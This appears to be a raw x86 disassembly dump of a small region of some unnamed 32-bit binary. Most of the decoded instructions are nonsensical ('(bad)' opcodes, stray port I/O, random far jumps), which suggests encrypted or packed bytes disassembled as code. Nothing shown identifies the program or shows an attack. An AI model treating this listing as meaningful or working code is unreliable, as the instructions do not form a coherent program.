  40bbff:	jae    0x40bc73
  40bc01:	or     cl,al
  40bc03:	xchg   edi,eax
  40bc04:	mov    esi,edi
  40bc06:	call   0x387c:0x8bc1e16d
  40bc0d:	xor    BYTE PTR ds:0x520923e9,bl
  40bc13:	leave  
  40bc14:	mov    WORD PTR [esi],?
  40bc16:	dec    ecx
  40bc17:	addr16 or eax,0xfdb5b98a
  40bc1d:	pop    edx
  40bc1e:	mov    ah,0x46
  40bc20:	xchg   edx,eax
  40bc21:	pop    ebp
  40bc22:	mov    ah,0x1e
  40bc24:	jne    0x40bbaf
  40bc26:	cmp    eax,DWORD PTR [esi]
  40bc28:	xchg   edx,eax
  40bc29:	test   ah,dh
  40bc2b:	inc    edx
  40bc2c:	and    DWORD PTR [ecx+0x6a11b397],eax
  40bc32:	arpl   WORD PTR [edi-0x23ff0054],bp
  40bc38:	add    BYTE PTR [ebp-0x5b0d41c8],ch
  40bc3e:	sbb    BYTE PTR [edx-0x67c9cc40],dl
  40bc44:	sbb    al,0x76
  40bc46:	repnz test DWORD PTR [edx],esi
  40bc49:	inc    ecx
  40bc4a:	push   eax
  40bc4b:	inc    edx
  40bc4c:	scas   eax,DWORD PTR es:[edi]
  40bc4d:	xchg   esp,eax
  40bc4e:	test   al,0xf7
  40bc50:	mov    ebx,0x9c441737
  40bc55:	jl     0x40bc05
  40bc57:	leave  
  40bc58:	dec    esi
  40bc5a:	push   es
  40bc5b:	mov    esp,DWORD PTR [ebp+0x5e]
  40bc5e:	pusha  
  40bc5f:	xor    DWORD PTR [ebp+edi*4+0x917c92c],esi
  40bc66:	es mov edi,0xf177adfa
  40bc6c:	js     0x40bc7c
  40bc6e:	out    0xa3,eax
  40bc70:	xchg   BYTE PTR [ebx],dh
  40bc72:	sbb    al,0x53
  40bc74:	daa    
  40bc75:	in     eax,0xe0
  40bc77:	fs cld 
  40bc79:	or     al,0xa7
  40bc7b:	sbb    al,cl
  40bc7d:	push   esp
  40bc7e:	icebp  
  40bc7f:	(bad)  
  40bc80:	shl    DWORD PTR [esi+0x35ee570e],1
  40bc86:	push   ebp
  40bc87:	pop    esi
  40bc88:	ss mov ebx,0x17a834c7
  40bc8e:	inc    ebp
  40bc8f:	and    BYTE PTR [esi-0xa],dl
  40bc92:	adc    eax,DWORD PTR [edx-0x51]
  40bc95:	mov    WORD PTR [ebx-0x5],ds
  40bc98:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bc99:	(bad)  
  40bc9a:	(bad)  
  40bc9b:	adc    BYTE PTR [esi],ch
  40bc9d:	push   edx
  40bc9e:	lea    eax,[eax]
  40bca0:	push   0x2b4c89a3
  40bca5:	mov    esp,0xe066b421
  40bcaa:	sti    
  40bcab:	sbb    DWORD PTR [eax+0x401ff375],ebx
  40bcb1:	test   al,0xd5
  40bcb3:	add    BYTE PTR [edx-0x5de16f66],ah
  40bcb9:	es push esi
  40bcbb:	mov    ds:0xdaf255fa,eax
  40bcc0:	out    dx,eax
  40bcc1:	pop    ds
  40bcc2:	mov    eax,0xea461b15
  40bcc7:	jno    0x40bd18
  40bcc9:	outs   dx,BYTE PTR ds:[esi]
  40bcca:	sbb    eax,0x6872f346
  40bccf:	fadd   QWORD PTR [ebx+0x5511d00a]
  40bcd5:	sub    al,dh
  40bcd7:	shl    esp,cl
  40bcd9:	and    DWORD PTR [eax-0x67506eea],edx
  40bcdf:	inc    edx
  40bce0:	jle    0x40bd16
  40bce2:	jmp    0x40bcc1
  40bce4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bce5:	inc    edx
  40bce6:	or     eax,0x914cddc1
  40bceb:	jnp    0x40bc75
  40bced:	push   0xffffffb6
  40bcef:	fwait
  40bcf0:	jns    0x40bcb7
  40bcf2:	dec    ecx
  40bcf3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bcf4:	push   cs
  40bcf5:	dec    esp
  40bcf6:	test   DWORD PTR ds:0x22c06e9a,eax
  40bcfc:	ret    
  40bcfd:	xor    al,0x7b
  40bcff:	or     bh,BYTE PTR [edx-0x72]
  40bd02:	adc    eax,DWORD PTR [edi-0x4cf9bfe6]
  40bd08:	adc    edi,edi
  40bd0a:	mov    BYTE PTR [esi-0x72],bl
  40bd0d:	jmp    0x496:0xfe56ba93
  40bd14:	shr    DWORD PTR [ebp-0x1e],cl
  40bd17:	inc    ecx
  40bd18:	enter  0x149,0x69
  40bd1c:	call   0x269e84e6
  40bd21:	jo     0x40bd99
  40bd23:	mov    al,0xf7
  40bd25:	pop    edi
  40bd26:	pop    edi
  40bd27:	mov    BYTE PTR [esi-0x36],0x9a
  40bd2b:	das    
  40bd2c:	rcr    DWORD PTR [ecx+0x7708af12],1
  40bd32:	mov    ebx,DWORD PTR [ecx-0x68f8503c]
  40bd38:	or     ecx,ebp
  40bd3a:	xor    eax,0x2cb7d35a
  40bd3f:	dec    edi
  40bd40:	dec    esi
  40bd41:	stos   DWORD PTR es:[edi],eax
  40bd42:	sti    
  40bd43:	mov    dh,0x9d
  40bd45:	push   ss
  40bd46:	xchg   DWORD PTR [eax+eax*8-0x7159b505],edx
  40bd4d:	pusha  
  40bd4e:	stos   BYTE PTR es:[edi],al
  40bd4f:	in     eax,0x15
  40bd51:	xchg   ebx,eax
  40bd52:	fistp  DWORD PTR [eax]
  40bd54:	out    0x2f,eax
  40bd56:	repnz cdq 
  40bd58:	sbb    ch,BYTE PTR [eax+0x27]
  40bd5b:	shr    BYTE PTR [eax-0x143c7ade],0x83
  40bd62:	imul   esi,DWORD PTR [esp+ebp*4],0x1177ce20
  40bd69:	xchg   BYTE PTR [ecx+0x2ff558b6],bl
  40bd6f:	js     0x40bd47
  40bd71:	jge    0x40bd58
  40bd73:	xchg   BYTE PTR gs:0xa072a7db,ah
  40bd7a:	cmp    al,0x8c
  40bd7c:	ss int3 
  40bd7e:	fadd   DWORD PTR [edx+0x5ec1a33e]
  40bd84:	adc    WORD PTR [esi+0x0],bx
  40bd88:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bd89:	sub    DWORD PTR [edx-0x250d95a7],0xffffff90
  40bd90:	inc    ebx
  40bd91:	push   ebp
  40bd92:	sbb    eax,0x3d8124d4
  40bd97:	sti    
  40bd98:	add    al,0xb8
  40bd9a:	xchg   ebp,eax
  40bd9b:	sub    BYTE PTR [ecx],dh
  40bd9d:	xor    eax,0xedcf3f0f
  40bda2:	lods   al,BYTE PTR ds:[esi]
  40bda3:	jle    0x40be23
  40bda5:	mov    eax,0x7578b9b
  40bdaa:	adc    bl,cl
  40bdac:	mov    al,ds:0x6e3e54a9
  40bdb1:	call   0xb029:0xa35c6cd3
  40bdb8:	cmp    DWORD PTR [ebx+0x5ac3c37f],edx
  40bdbe:	inc    ebx
  40bdbf:	pop    ebx
  40bdc0:	add    esp,DWORD PTR [eax-0x449f07a8]
  40bdc6:	cmp    al,cl
  40bdc8:	add    esi,DWORD PTR [ebx]
  40bdca:	and    eax,0x2256ca2e
  40bdcf:	lds    esi,FWORD PTR ds:0x1436bb6c
  40bdd5:	and    dl,ch
  40bdd7:	mov    edx,0xcd02c38b
  40bddc:	rcl    BYTE PTR [edi+0x5c],cl
  40bddf:	popf   
  40bde0:	jmp    0x93d469e9
  40bde5:	cli    
  40bde6:	addr16 pop es
  40bde8:	cmp    al,0x4c
  40bdea:	pop    esp
  40bdeb:	jg     0x40bddb
  40bded:	mov    cl,0x88
  40bdef:	scas   al,BYTE PTR es:[edi]
  40bdf0:	lock sub DWORD PTR ds:0x1aaa2d11,0xffffffd3
  40bdf8:	mov    WORD PTR [eax],?
  40bdfa:	fcomp  DWORD PTR [esi]
  40bdfc:	mov    esp,edi
  40bdfe:	mov    cl,0x8
  40be01:	or     eax,ebx
  40be03:	ror    ah,1
  40be05:	repz or ebx,0xffffffe8
  40be09:	outs   dx,DWORD PTR ds:[esi]
  40be0a:	mov    bl,bh
  40be0c:	cmp    esp,edi
  40be0e:	int3   
  40be0f:	inc    esp
  40be10:	es gs pop ecx
  40be13:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40be14:	xchg   DWORD PTR [edi],ebp
  40be16:	pop    ebp
  40be17:	stc    
  40be18:	out    0x9c,al
  40be1a:	xchg   ecx,eax
  40be1b:	and    BYTE PTR [edi-0x4f730b04],0xb6
  40be22:	jbe    0x40bdde
  40be24:	jg     0x40be57
  40be26:	je     0x40be78
  40be28:	mov    ecx,0xc8109cc7
  40be2d:	into   
  40be2e:	scas   al,BYTE PTR es:[edi]
  40be2f:	cmp    DWORD PTR [edx+ebx*1],ecx
  40be32:	mov    esi,0xf9b54b69
  40be37:	fmulp  st(3),st
  40be39:	ss cmp eax,0xe4f5256
  40be3f:	ds lock mov edx,0x190d178c
  40be46:	mov    bl,0x6e
  40be48:	pop    es
  40be49:	(bad)  
  40be4b:	sbb    al,0xfd
  40be4d:	xchg   BYTE PTR [edx],ch
  40be4f:	push   ebx
  40be50:	stos   DWORD PTR es:[edi],eax
  40be51:	xor    edi,DWORD PTR [ebx]
  40be53:	xchg   edi,eax
  40be54:	mov    fs,eax
  40be56:	shr    BYTE PTR fs:[edx],cl
  40be59:	fdivr  QWORD PTR [edi]
  40be5b:	adc    dl,BYTE PTR [ebp-0x5d]
  40be5e:	cli    
  40be5f:	pop    ss
  40be60:	hlt    
  40be61:	pop    ss
  40be62:	push   edi
  40be63:	push   edi
  40be64:	pop    ss
  40be65:	mov    al,0xa0
  40be67:	inc    edx
  40be68:	popf   
  40be69:	mov    cl,0x1c
  40be6b:	sub    eax,0x16b1869c
  40be70:	xor    DWORD PTR [ecx+eax*4+0x20],ecx
  40be74:	repnz mov bl,cl
  40be77:	hlt    
  40be78:	pop    ds
  40be79:	hlt    
  40be7a:	xchg   edx,eax
  40be7b:	dec    ebx
  40be7c:	push   0x6c30d936
  40be81:	xchg   ecx,eax
  40be82:	push   0x63d3f252
  40be87:	push   eax
  40be88:	cmp    eax,0x92379e50
  40be8d:	mov    dh,0x4e
  40be8f:	pop    edi
  40be90:	sbb    DWORD PTR [edx],0xf0f999d3
  40be96:	xlat   BYTE PTR ds:[ebx]
  40be97:	enter  0xce4e,0x6
  40be9b:	(bad)  
  40be9c:	mov    eax,0xaecc6d4c
  40bea1:	inc    esp
  40bea2:	sar    BYTE PTR [edi-0x229d1a50],cl
  40bea8:	jns    0x40bf01
  40beaa:	das    
  40beab:	idiv   BYTE PTR ds:0xc76802fd
  40beb1:	xor    esi,edx
  40beb3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40beb4:	lahf   
  40beb5:	rcr    BYTE PTR [ebp+0x51],cl
  40beb8:	test   al,0x2e
  40beba:	or     BYTE PTR [ebx],al
  40bebc:	(bad)  
  40bebd:	or     BYTE PTR [esi+0x13],ah
  40bec0:	sub    DWORD PTR [ecx+0xdd479b0],esi
  40bec6:	push   0x52a5ff1e
  40becb:	cmp    DWORD PTR [edx-0xc],edx
  40bece:	push   es
  40becf:	jl     0x40be95
  40bed1:	lds    esp,FWORD PTR [esi+0x6a]
  40bed4:	sub    al,0x5a
  40bed6:	aam    0x57
  40bed8:	js     0x40bedd
  40beda:	aad    0xbb
  40bedc:	sbb    DWORD PTR [esi+eiz*1],esi
  40bedf:	inc    ebx
  40bee0:	dec    edx
  40bee1:	xchg   esi,eax
  40bee2:	in     al,0xc
  40bee4:	push   eax
  40bee5:	xor    ah,ch
  40bee7:	ret    
  40bee8:	ds scas eax,DWORD PTR es:[edi]
  40beea:	jns    0x40bf35
  40beec:	jmp    0x83ad:0x332cbf65
  40bef3:	scas   al,BYTE PTR es:[edi]
  40bef4:	jne    0x40bf34
  40bef6:	or     BYTE PTR [esi-0x60d4646a],0x4d
  40befd:	sub    ch,ch
  40beff:	shr    ebx,cl
  40bf01:	adc    DWORD PTR [edx],edi
  40bf03:	dec    ebx
  40bf04:	mov    ebx,0xaa281052
  40bf09:	repz (bad) 
  40bf0b:	fimul  WORD PTR [ecx]
  40bf0d:	cmp    eax,0x22139dfb
  40bf12:	push   ds
  40bf13:	scas   eax,DWORD PTR es:[edi]
  40bf14:	and    DWORD PTR [esi-0x5a295e2a],edx
  40bf1a:	arpl   WORD PTR [esi],bx
  40bf1c:	js     0x40beb8
  40bf1e:	dec    ebx
  40bf1f:	es scas al,BYTE PTR es:[edi]
  40bf21:	lahf   
  40bf22:	dec    ebx
  40bf23:	add    eax,0x56c43596
  40bf28:	jmp    0x6f59:0xf4586b33
  40bf2f:	mov    edx,0x8e83b1d9
  40bf34:	imul   edx,DWORD PTR [ebx-0xaec7409],0xc716e5c
  40bf3e:	mul    BYTE PTR [esp+ecx*8+0x332e802e]
  40bf45:	mov    dl,0x83
  40bf47:	xor    BYTE PTR [ecx+0x5f],al
  40bf4a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bf4b:	dec    eax
  40bf4c:	push   cs
  40bf4d:	push   cs
  40bf4e:	ret    
  40bf4f:	daa    
  40bf50:	scas   al,BYTE PTR es:[edi]
  40bf51:	push   eax
  40bf52:	fsub   st,st(1)
  40bf54:	xchg   BYTE PTR [edi],bh
  40bf56:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bf57:	xor    eax,0xc1594c5f
  40bf5c:	or     dl,BYTE PTR [eax+ebx*4+0x38e3f53]
  40bf63:	push   cs
  40bf64:	fbld   TBYTE PTR [ebp+0x1b]
  40bf67:	cmp    al,0xf6
  40bf69:	sbb    eax,0x57d42ae5
  40bf6e:	ja     0x40bf6e
  40bf70:	iret   
  40bf71:	int    0xa5
  40bf73:	sub    edi,DWORD PTR [edx]
  40bf75:	rol    esp,1
  40bf77:	mov    ds:0x4560c1c6,al
  40bf7c:	rcl    BYTE PTR [edi],1
  40bf7e:	inc    edi
  40bf7f:	push   ebx
  40bf80:	push   cs
  40bf81:	cmp    al,0x15
  40bf83:	fst    QWORD PTR [ebx+ecx*2-0x1555ddfe]
  40bf8a:	dec    ebx
  40bf8b:	jno    0x40bf8f
  40bf8d:	pop    esp
  40bf8e:	jmp    0xf5dd6142
  40bf93:	dec    DWORD PTR [ebx]
  40bf95:	iret   
  40bf96:	arpl   WORD PTR [ebx],bp
  40bf98:	icebp  
  40bf99:	push   eax
  40bf9a:	xor    al,0x15
  40bf9c:	je     0x40bfdf
  40bf9e:	scas   eax,DWORD PTR es:[edi]
  40bf9f:	sbb    eax,0x66c033cc
  40bfa4:	mov    ah,0x5f
  40bfa6:	jge    0x40bfcc
  40bfa8:	test   DWORD PTR [ebx-0x5b57e3fb],ecx
  40bfae:	sbb    al,0x66
  40bfb0:	shl    BYTE PTR [ecx-0x43438477],0x14
  40bfb7:	test   edx,ecx
  40bfb9:	jne    0x40bfad
  40bfbb:	and    BYTE PTR [ebx],0xb5
  40bfbe:	and    esp,DWORD PTR [ebx-0x14]
  40bfc1:	sub    DWORD PTR [edx],ebx
  40bfc3:	imul   edx,DWORD PTR [ebx+0x2b2fb687],0xb151a87d
  40bfcd:	xor    eax,0x94c18982
  40bfd2:	je     0x40bfc5
  40bfd4:	jge    0x40c007
  40bfd6:	in     eax,0xd9
  40bfd8:	push   eax
  40bfd9:	sub    ebx,DWORD PTR [ebp+ebx*1-0x71]
  40bfdd:	shl    al,0x15
  40bfe0:	xchg   ecx,eax
  40bfe1:	in     al,dx
  40bfe2:	retf   
  40bfe3:	imul   ecx,eax,0x51
  40bfe6:	rcl    al,1
  40bfe8:	jno    0x40c02f
  40bfea:	sahf   
  40bfeb:	aad    0xe4
  40bfed:	stc    
  40bfee:	xchg   edx,eax
  40bfef:	push   ebp
  40bff0:	xchg   edi,eax
  40bff1:	sbb    eax,0xeefad4b7
  40bff6:	stos   BYTE PTR es:[edi],al
  40bff7:	mov    edx,0x4c31a760
  40bffc:	pop    ebx
  40bffd:	cwde   
  40bffe:	fdivr  QWORD PTR [eax-0x5b]
  40c001:	sub    DWORD PTR [ecx+0x313a1bdb],eax
  40c007:	rcr    BYTE PTR [edi],cl
  40c009:	es jl  0x40bfbb
  40c00c:	mov    al,ds:0x3b5c9f58
  40c011:	pop    esi
  40c012:	retf   
  40c013:	adc    al,0x94
  40c015:	fcomp  QWORD PTR [edx+0x11]
  40c018:	inc    ebx
  40c019:	adc    eax,0x982881fd
  40c01e:	cmp    al,0xaf
  40c020:	scas   al,BYTE PTR es:[edi]
  40c021:	sub    dl,BYTE PTR [eax+esi*1-0x7a]
  40c025:	mov    al,0xf7
  40c027:	stc    
  40c028:	cmc    
  40c029:	xor    eax,0x4d8bb015
  40c02e:	clc    
  40c02f:	xor    eax,esi
  40c031:	add    eax,0x327298
  40c036:	mov    DWORD PTR [ecx],eax
  40c038:	mov    eax,DWORD PTR [ebp-0x24]
  40c03b:	mov    ecx,DWORD PTR [ebp-0x8]
  40c03e:	jmp    0x40c549
  40c043:	retf   0xc63f
  40c046:	retf   
  40c047:	leave  
  40c048:	leave  
  40c049:	leave  
  40c04a:	cmp    eax,0xf50d3f64
  40c04f:	sbb    esi,esp
  40c051:	in     eax,0x8c
  40c053:	xchg   esp,eax
  40c054:	mov    eax,ds:0x7c6a7878
  40c059:	js     0x40c0d3
  40c05b:	js     0x40c0c4
  40c05d:	mov    al,0x75
  40c05f:	pushf  
  40c060:	shl    DWORD PTR [ebx+0x274c134e],0x0
  40c067:	or     DWORD PTR [edi],0x6a411e4e
  40c06d:	callw  0x14e6
  40c071:	and    ah,bl
  40c073:	or     al,0x1
  40c075:	jge    0x40c097
  40c077:	fisttp DWORD PTR [ecx-0x4bd8eeaf]
  40c07d:	(bad)  [edx]
  40c07f:	inc    ecx
  40c080:	inc    ebp
  40c081:	pusha  
  40c082:	sahf   
  40c083:	push   ebp
  40c084:	xor    DWORD PTR [ecx],ecx
  40c086:	popf   
  40c087:	jo     0x40c05a
  40c089:	sar    DWORD PTR [edx+edi*8-0xe8ebdfb],1
  40c090:	add    DWORD PTR [ebx],esp
  40c092:	mov    dl,0xe9
  40c094:	xor    cl,BYTE PTR [esi-0x6]
  40c097:	test   DWORD PTR ds:[ebx],0xb88f16fc
  40c09e:	or     bl,0xb3
  40c0a1:	out    0x8b,eax
  40c0a3:	mov    ebx,0xc0ee6665
  40c0a8:	mov    DWORD PTR ds:0x47eee3d6,esp
  40c0ae:	test   al,0xad
  40c0b0:	mov    al,ds:0x478e5f91
  40c0b5:	(bad)  
  40c0b6:	popf   
  40c0b7:	fcmovnbe st,st(3)
  40c0b9:	cmp    BYTE PTR [edi-0x7a],ch
  40c0bc:	jmp    0x85c5:0xb2f39067
  40c0c3:	xchg   ecx,eax
  40c0c4:	dec    ecx
  40c0c5:	sti    
  40c0c6:	add    DWORD PTR [ebp+0x7696d5b5],edx
  40c0cc:	cs fxam 
  40c0cf:	loope  0x40c07b
  40c0d1:	fidiv  WORD PTR [edi]
  40c0d3:	stc    
  40c0d4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c0d5:	xchg   ebp,eax
  40c0d6:	aaa    
  40c0d7:	daa    
  40c0d8:	div    BYTE PTR [edi]
  40c0da:	out    dx,eax
  40c0db:	add    al,0x73
  40c0dd:	lea    esi,[edi-0x6325dec9]
  40c0e3:	xlat   BYTE PTR ds:[ebx]
  40c0e4:	dec    edi
  40c0e5:	mov    gs,WORD PTR [ebp-0x50]
  40c0e8:	addr16 and ebx,esi
  40c0eb:	or     cl,dl
  40c0ed:	cmp    BYTE PTR [esi+0x6b539fae],cl
  40c0f3:	and    DWORD PTR [ecx+0x3b],eax
  40c0f6:	pushf  
  40c0f7:	sbb    bh,dl
  40c0f9:	adc    esi,edi
  40c0fb:	jb     0x40c0a5
  40c0fd:	sub    BYTE PTR [esi+ebx*2],ch
  40c100:	inc    esp
  40c101:	cdq    
  40c102:	leave  
  40c103:	dec    eax
  40c104:	daa    
  40c105:	and    dh,BYTE PTR [ebx+0x196f91c7]
  40c10b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c10c:	in     eax,0xc5
  40c10e:	inc    edx
  40c10f:	jno    0x40c124
  40c111:	retf   
  40c112:	(bad)  
  40c113:	shr    BYTE PTR [ebp+0x6c2b2df9],cl
  40c119:	mov    eax,0xc1d7eef4
  40c11e:	pop    esi
  40c11f:	ret    0xd63
  40c122:	je     0x40c17c
  40c124:	cdq    
  40c125:	sahf   
  40c126:	push   edi
  40c127:	ret    
  40c128:	adc    ebp,0xfc0f1536
  40c12e:	sub    DWORD PTR [eax],ecx
  40c130:	mov    ah,0xd5
  40c132:	pop    esi
  40c133:	push   esi
  40c134:	push   es
  40c135:	push   ebp
  40c136:	fcomp  QWORD PTR [ebx]
  40c138:	mov    bh,0x75
  40c13a:	jge    0x40c0f5
  40c13c:	jno    0x40c0d7
  40c13e:	or     BYTE PTR [eax],bl
  40c140:	adc    eax,0x61b3f391
  40c145:	mov    ebp,0x3a1b7d00
  40c14a:	lahf   
  40c14b:	jge    0x40c0ce
  40c14d:	test   BYTE PTR [edx-0x12],ah
  40c150:	xor    ch,BYTE PTR [edx-0x30]
  40c153:	stos   DWORD PTR es:[edi],eax
  40c154:	cld    
  40c155:	fst    DWORD PTR [ebp+eiz*8-0x66]
  40c159:	xchg   BYTE PTR [ecx-0x34],dl
  40c15c:	out    dx,eax
  40c15d:	sub    BYTE PTR [ebp+0x78117162],dl
  40c163:	jno    0x40c14b
  40c165:	sbb    DWORD PTR [edi-0x2b9bfba9],0xffffff96
  40c16c:	adc    BYTE PTR [edx-0x68],ch
  40c16f:	jmp    0x40c1b3
  40c171:	jno    0x40c10a
  40c173:	sbb    eax,edx
  40c175:	and    ebp,DWORD PTR [eax-0x71698340]
  40c17b:	mov    ah,0x20
  40c17d:	(bad)  
  40c17f:	xchg   ebp,eax
  40c180:	push   0x32
  40c182:	pop    edi
  40c183:	mov    ecx,DWORD PTR [edi+0xaff98c2]
  40c189:	test   ah,bh
  40c18b:	inc    esp
  40c18c:	xchg   esp,eax
  40c18d:	mov    ebp,0x5b37e38a
  40c192:	imul   eax,edi,0xf31d5f77
  40c198:	xchg   ebx,eax
  40c199:	jmp    0xe297:0x3e15810c
  40c1a0:	and    esi,0xffffffe6
  40c1a3:	mov    dh,0x8
  40c1a5:	mov    ecx,0x4c10f000
  40c1aa:	sbb    BYTE PTR [ebx+0x603c6804],dl
  40c1b0:	or     ebp,esi
  40c1b2:	xchg   ebp,eax
  40c1b3:	outs   dx,DWORD PTR ds:[esi]
  40c1b4:	adc    DWORD PTR [esi-0x64c2b63f],0xe06218e2
  40c1be:	xor    DWORD PTR [ecx],esi
  40c1c0:	iret   
  40c1c1:	sbb    eax,0xb2c3a3b3
  40c1c6:	aaa    
  40c1c7:	outs   dx,DWORD PTR ds:[esi]
  40c1c8:	scas   al,BYTE PTR es:[edi]
  40c1c9:	ret    
  40c1ca:	add    eax,edi
  40c1cc:	inc    edx
  40c1cd:	fcompp 
  40c1cf:	cdq    
  40c1d0:	xchg   DWORD PTR [ecx],edx
  40c1d2:	int3   
  40c1d3:	shl    BYTE PTR [edi],1
  40c1d5:	and    eax,0x305ad3a2
  40c1da:	in     al,0x84
  40c1dc:	push   ds
  40c1dd:	shr    DWORD PTR [eax],0xf7
  40c1e0:	test   al,0x4d
  40c1e2:	mov    ebx,0x1bb44664
  40c1e7:	repz test DWORD PTR [esi+0x5ebea0eb],0x12ee12f6
  40c1f2:	test   DWORD PTR ss:[ecx+0x641f622d],esp
  40c1f9:	pop    esp
  40c1fa:	pop    edx
  40c1fb:	test   BYTE PTR [edi+eiz*8+0x22],al
  40c1ff:	out    0xca,al
  40c201:	sub    eax,0xaad3fe7
  40c206:	shr    ah,0x58
  40c209:	xor    DWORD PTR [ebx+esi*8-0x40ee4cd7],edi
  40c210:	xchg   ecx,eax
  40c211:	sub    al,0x2
  40c213:	imul   edx,DWORD PTR [edx+eax*4-0x1e],0x4d
  40c218:	mov    ebx,0x9a09c7b9
  40c21d:	push   esp
  40c21e:	jae    0x40c21f
  40c220:	push   es
  40c221:	mov    ds,eax
  40c223:	xlat   BYTE PTR ds:[ebx]
  40c224:	mov    cl,0xe6
  40c226:	imul   BYTE PTR [edx+0x40655a9a]
  40c22c:	xor    DWORD PTR [edi+0xc3090f8],ebp
  40c232:	add    ebp,esp
  40c234:	push   cs
  40c235:	xchg   ebp,eax
  40c236:	ds push cs
  40c238:	cwde   
  40c239:	add    ax,0xd85f
  40c23d:	test   eax,0x98fc2cc
  40c242:	movs   WORD PTR es:[edi],WORD PTR ds:[esi]
  40c244:	pop    ebp
  40c245:	cmp    ebp,DWORD PTR [eax+ebx*1-0x59]
  40c249:	shl    eax,0xf4
  40c24c:	pop    edi
  40c24d:	inc    edx
  40c24e:	das    
  40c24f:	mov    esi,0x81291d88
  40c254:	mov    edi,0xc271f6de
  40c259:	sub    esp,DWORD PTR [edx+0x62]
  40c25c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c25d:	out    0x8d,al
  40c25f:	and    DWORD PTR [edi],0x5c
  40c262:	xor    al,0x84
  40c264:	mov    dl,0x10
  40c266:	repz xor eax,0xb8a4e2ed
  40c26c:	push   cs
  40c26d:	sbb    al,0x80
  40c26f:	mov    es,WORD PTR [edi-0x223c7a39]
  40c275:	adc    eax,0xa633deee
  40c27a:	fdivr  QWORD PTR [ecx+ecx*4+0x6e816dfc]
  40c281:	frstor ds:0xf09db7bf
  40c287:	jns    0x40c292
  40c289:	jno    0x40c277
  40c28b:	imul   eax,DWORD PTR [esi+ebx*1],0x73
  40c28f:	out    0x31,eax
  40c291:	inc    edx
  40c292:	sub    al,0x7c
  40c294:	dec    edx
  40c295:	add    edi,ecx
  40c297:	jge    0x40c239
  40c299:	data16 add bh,BYTE PTR [ebp+0x7b584dc7]
  40c2a0:	enter  0x7d1a,0x24
  40c2a4:	fdiv   st(6),st
  40c2a6:	fdivr  QWORD PTR ds:0x93bd8a14
  40c2ac:	or     DWORD PTR [ecx],esp
  40c2ae:	lods   eax,DWORD PTR ds:[esi]
  40c2af:	mov    ch,0xb4
  40c2b1:	cmp    DWORD PTR [edx-0x14],ebp
  40c2b4:	sub    al,0x2e
  40c2b6:	cld    
  40c2b7:	pusha  
  40c2b8:	pop    ebx
  40c2b9:	cld    
  40c2ba:	lods   al,BYTE PTR ds:[esi]
  40c2bb:	push   ebx
  40c2bc:	dec    ecx
  40c2bd:	jbe    0x40c296
  40c2bf:	xor    dh,bh
  40c2c1:	mov    al,0x84
  40c2c3:	mul    ecx
  40c2c5:	dec    ebp
  40c2c6:	sti    
  40c2c7:	pop    ss
  40c2c8:	inc    edx
  40c2c9:	les    eax,FWORD PTR [eax+0x5c1125ab]
  40c2cf:	mov    DWORD PTR [eax+esi*8],ebp
  40c2d2:	mov    ds:0x62f8d6de,al
  40c2d7:	enter  0x3aac,0xf9
  40c2db:	test   DWORD PTR [eax],0x2f92f96e
  40c2e1:	pop    ds
  40c2e2:	dec    ecx
  40c2e3:	std    
  40c2e4:	jecxz  0x40c2f5
  40c2e6:	and    eax,0xa61fee4c
  40c2eb:	in     eax,0x3e
  40c2ed:	xor    ebp,eax
  40c2ef:	imul   esi,DWORD PTR [ecx],0x5b00d824
  40c2f5:	xchg   esp,eax
  40c2f6:	loop   0x40c2e5
  40c2f8:	stos   DWORD PTR es:[edi],eax
  40c2f9:	in     al,0x6a
  40c2fb:	lea    esp,[ecx-0x7286c3e6]
  40c301:	js     0x40c318
  40c303:	fbld   TBYTE PTR [eax-0x3c2bd0cd]
  40c309:	and    BYTE PTR [edi],0x88
  40c30c:	add    ah,dh
  40c30e:	mov    ds:0x6d357a75,al
  40c313:	inc    esi
  40c314:	push   eax
  40c315:	dec    ecx
  40c316:	aam    0xcd
  40c318:	popa   
  40c319:	leave  
  40c31a:	repz xor BYTE PTR [esi-0x22],bh
  40c31e:	xchg   ecx,eax
  40c31f:	pusha  
  40c320:	xor    bh,BYTE PTR [ecx+0x48]
  40c323:	sbb    eax,DWORD PTR [edx+0x1b]
  40c326:	pminub mm7,mm1
  40c329:	pop    edi
  40c32a:	popa   
  40c32b:	xchg   DWORD PTR [ebp+0x55348e4d],ebp
  40c331:	dec    ebx
  40c332:	mov    esi,0xfcd8c97d
  40c337:	mov    bl,0xdd
  40c339:	(bad)  
  40c33a:	stc    
  40c33b:	jns    0x40c3a2
  40c33d:	ds or  ebp,edi
  40c340:	xchg   esi,eax
  40c341:	hlt    
  40c342:	and    DWORD PTR [esi],edi
  40c344:	mov    fs,WORD PTR [ebx+0xd004cdc]
  40c34a:	(bad)  
  40c34b:	push   esp
  40c34c:	gs inc esi
  40c34e:	loopne 0x40c2f0
  40c350:	jl     0x40c327
  40c352:	push   ebp
  40c353:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c354:	sbb    al,0xf5
  40c356:	scas   eax,DWORD PTR es:[edi]
  40c357:	outs   dx,DWORD PTR ds:[esi]
  40c358:	cld    
  40c359:	mov    al,0xa1
  40c35b:	mov    BYTE PTR [esi],bh
  40c35d:	sbb    DWORD PTR [ebx],0x14
  40c360:	pusha  
  40c361:	aam    0xa1
  40c363:	neg    eax
  40c365:	and    al,0x94
  40c367:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c368:	or     BYTE PTR ds:0x86accc8d,ch
  40c36e:	inc    ebx
  40c36f:	mov    ch,0x29
  40c371:	and    BYTE PTR [ecx-0x320a58f3],bh
  40c377:	inc    edx
  40c378:	inc    edi
  40c379:	mov    ah,0x7f
  40c37b:	in     al,0x50
  40c37d:	stc    
  40c37e:	push   ebp
  40c37f:	jns    0x40c307
  40c381:	inc    ebx
  40c382:	dec    esi
  40c383:	xchg   edi,eax
  40c384:	inc    edx
